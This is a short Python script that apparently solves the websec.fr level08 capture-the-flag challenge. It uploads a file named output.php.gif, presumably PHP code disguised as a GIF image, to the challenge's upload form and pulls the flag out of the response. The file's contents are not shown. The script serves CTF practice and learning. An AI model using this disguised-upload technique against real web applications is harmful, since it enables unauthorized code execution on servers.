from requests import *
import sys
import re

url = 'http://websec.fr/level08/index.php'
with open('/root/output.php.gif') as file_gif:
    data = {
        'submit' : 'Upload Image'
    }
    files = {
        'fileToUpload' : file_gif
    }

    r = post(url , data=data , files=files)
    print(''.join(re.findall('(WEBSEC{.+})', r.text)))
